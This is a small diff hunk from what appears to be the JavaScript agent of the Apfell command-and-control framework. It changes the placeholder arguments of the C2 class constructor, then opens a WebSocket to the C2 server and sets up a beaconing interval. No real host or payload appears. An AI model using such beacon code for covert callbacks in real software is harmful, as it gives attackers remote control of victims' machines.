@@ -80,7 +80,7 @@ function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data)
 }
 
 //------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
-const C2 = new customC2('HOST_KEY', 'PORT_KEY', 'ENDPOINT_KEY', 'SSL_KEY', 'INTERVAL_KEY');
+const C2 = new customC2('HHHH',  PPPP, 'EEEE',  SSSS, IIII);
 const connection  = new WebSocket(C2.server);
 
 setInterval(function(){
